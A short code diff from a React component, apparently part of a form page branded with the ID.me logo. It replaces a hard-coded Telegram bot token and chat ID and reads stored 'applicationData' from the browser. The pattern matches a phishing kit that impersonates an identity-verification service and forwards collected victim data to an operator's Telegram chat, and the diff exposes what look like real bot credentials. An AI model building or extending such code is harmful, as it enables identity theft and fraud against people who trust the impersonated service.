@@ -3,8 +3,8 @@ import logo from '../assets/ID.me_Logo.png'
 import connect from '../assets/connect.jpg'
 import elogo from '../assets/logo-removebg-preview.png'
 
-const TELEGRAM_BOT_TOKEN = "6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo";
-const TELEGRAM_CHAT_ID = "6639364559";
+const TELEGRAM_BOT_TOKEN = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
+const TELEGRAM_CHAT_ID = "7062736155";
 const W3form: React.FC = () => {
  
   const storedData = localStorage.getItem("applicationData");
